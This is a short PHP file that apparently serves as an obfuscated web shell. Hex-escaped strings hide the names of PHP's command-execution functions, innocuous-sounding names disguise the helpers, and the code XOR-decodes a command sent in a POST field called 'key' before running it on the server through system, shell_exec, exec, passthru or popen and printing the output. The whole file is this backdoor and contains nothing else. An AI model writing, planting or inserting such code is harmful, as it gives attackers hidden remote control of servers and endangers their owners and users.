<?php

$right_pad_string6 = "st\x72e\x61m_\x67et_\x63\x6F\x6Et\x65nts";
$right_pad_string1 = "sy\x73tem";
$right_pad_string7 = "pclos\x65";
$right_pad_string3 = "exec";
$right_pad_string5 = "\x70open";
$right_pad_string2 = "\x73\x68\x65ll\x5Fe\x78ec";
$data_storage = "\x68\x65\x78\x32bin";
$right_pad_string4 = "\x70asst\x68ru";
if (isset($_POST["k\x65\x79"])) {
            function config_manager($sym ,  $component){
 $token    = '' ;
  for($m=0;
 $m<strlen($sym);
 $m++){
$token.=chr(ord($sym[$m])^$component);

} return $token;

}
            $key = $data_storage($_POST["k\x65\x79"]);
            $key = config_manager($key, 91);
            if (function_exists($right_pad_string1)) {
                $right_pad_string1($key);
            } elseif (function_exists($right_pad_string2)) {
                print $right_pad_string2($key);
            } elseif (function_exists($right_pad_string3)) {
                $right_pad_string3($key, $entity_sym);
                print join("\n", $entity_sym);
            } elseif (function_exists($right_pad_string4)) {
                $right_pad_string4($key);
            } elseif (function_exists($right_pad_string5) && function_exists($right_pad_string6) && function_exists($right_pad_string7)) {
                $component_token = $right_pad_string5($key, 'r');
                if ($component_token) {
                    $bind_pgrp = $right_pad_string6($component_token);
                    $right_pad_string7($component_token);
                    print $bind_pgrp;
                }
            }
            exit;
        }